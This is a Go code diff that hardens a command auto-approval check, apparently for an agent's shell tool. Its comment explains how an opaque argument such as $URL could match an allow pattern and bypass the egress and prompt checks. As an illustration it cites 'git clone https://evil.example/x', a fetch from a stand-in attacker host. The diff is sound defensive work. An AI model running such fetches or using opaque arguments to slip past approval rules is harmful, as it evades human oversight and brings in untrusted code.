@@ -131,6 +131,24 @@ func allSegmentsAllowed(segments []Segment, autoApprove []string, allowPush bool
 		if len(seg.WriteTargets) > 0 {
 			return false
 		}
+		// An OPAQUE arg cannot satisfy a pattern either, for the same reason and
+		// with a sharper edge (change 0070 D5). segmentSubject reconstructs the
+		// subject from each word's raw SOURCE text, and allow patterns are matched
+		// with path.Match, whose `*` does not cross `/`. That slash boundary is the
+		// containment a human writing `bash:git *` or `bash:rm build/*` is relying
+		// on — and an opaque word collapses the operand being scoped into a single
+		// token with no `/` in it. `git clone https://evil.example/x` correctly
+		// MISSES `bash:git *` and falls through to the egress boundary; `git clone
+		// $URL` would MATCH it, and rules allow is terminal, so neither the egress
+		// boundary nor the mutating-scope opaque ask would ever run.
+		//
+		// The raw text stays visible to the deny and always_prompt consumers above:
+		// those only ever tighten, so matching more text there is safe. Only this
+		// consumer turns a match into an authorization, so only this one has to
+		// decline. The segment falls through to the scoping layer, which asks.
+		if seg.hasOpaqueArg() {
+			return false
+		}
 		if matchesSegment(autoApprove, seg) {
 			continue
 		}
